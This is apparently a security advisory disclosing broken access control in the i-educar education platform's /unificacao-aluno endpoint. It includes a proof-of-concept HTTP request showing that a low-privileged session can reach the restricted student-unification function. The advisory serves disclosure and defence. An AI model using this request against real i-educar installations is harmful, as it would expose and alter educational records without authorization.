# Broken Access Control  in `/unificacao-aluno` Endpoint

---

## Summary

A **Broken Access Control** vulnerability was identified in the `/unificacao-aluno` endpoint of the _i-educar_ application. This vulnerability allows users without proper permissions to access restricted functionality, bypassing authorization checks.

---

## Details

**Vulnerable Endpoint:** `GET /unificacao-aluno`  
**Authentication:** Required

The application fails to properly validate user permissions before granting access to this endpoint. As a result, even low-privileged users can successfully access the functionality intended only for permited users .

---

## PoC

1. Authenticate as a non-privileged user.
![[Pasted image 20250914131157.png]]
![[Pasted image 20250821191019.png]]
    
2. Send the following request::

```
GET /unificacao-aluno HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: http://localhost/intranet/educar_consulta_movimento_mensal_lst.php?ano=2025&ref_cod_instituicao=1&ref_cod_escola=4&ref_cod_curso=3&ref_cod_serie=&ref_cod_turma=&data_inicial=01%2F08%2F2025&data_final=31%2F08%2F2025&modalidade=1
Cookie: i_educar_session=[low_privileged cookie]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```
    
3. We could observe that we have access to the page and to the function. And, this user, should not do that.

![[Pasted image 20250914132409.png]]

---

## Impact

Broken Access Control vulnerabilities can have severe consequences, including:

- Unauthorized access to restricted functionality
    
- Escalation of privileges for low-level users
    
- Exposure of sensitive data and potential system compromise
    
- Loss of confidentiality and integrity of educational records
    
- Reputational damage to the organization
    

---

## Discoverer

[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)